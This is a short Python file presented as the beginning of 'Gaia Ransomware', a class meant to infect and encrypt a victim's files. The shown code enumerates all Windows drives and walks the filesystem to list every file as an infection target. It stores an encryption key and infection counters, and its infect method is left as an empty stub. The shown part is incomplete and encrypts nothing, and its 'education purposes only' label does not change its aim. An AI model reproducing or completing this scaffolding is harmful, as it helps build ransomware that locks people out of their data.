'''
 >>> Code by Lil_Tim
 >>> Gaia Ransomware
'''

import os

class Gaia:
    '''
    This class is a ransomware instance (for education purposes only)
    '''
    def __init__(self,start_folder:str=None,encryption_key:str=None,extension=None,max_infections:int=0,number_of_infections:int=1) -> None:
        
        print('>>> Gaia initialized...')
        self.file_list = []
        self.start_folder = start_folder
        self.encrypt_key = encryption_key
        self.extension = extension
        self.max_infect = max_infections
        self.number_of_infect = number_of_infections
        self.infection_table = []
        
    def get_parameters(self) -> None:
        '''
        This function prints the gaia's instance parameters
        '''
        print(self)
        print(self.start_folder)
        print(self.encrypt_key)
        print(self.max_infect)
        print(self.number_of_infect)
        
    def get_drives(self) -> list:
        '''
        Gets all system drives in a tuple
        '''
        drv = [chr(i)+':' for i in range(65,91) if os.path.exists(chr(i)+':')]
        return drv

    def to_infect(self, file):
        ...

    def get_files(self):
        '''
        Gets all system files to infect
        '''
        drv = self.get_drives()
        if self.start_folder in drv:
            for i in range(len(drv)):
                drv[i] += '\\'
            while(not os.getcwd() in drv):
                os.chdir('..')
                print(os.getcwd())
        system = os.walk(self.start_folder, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                print(file_path)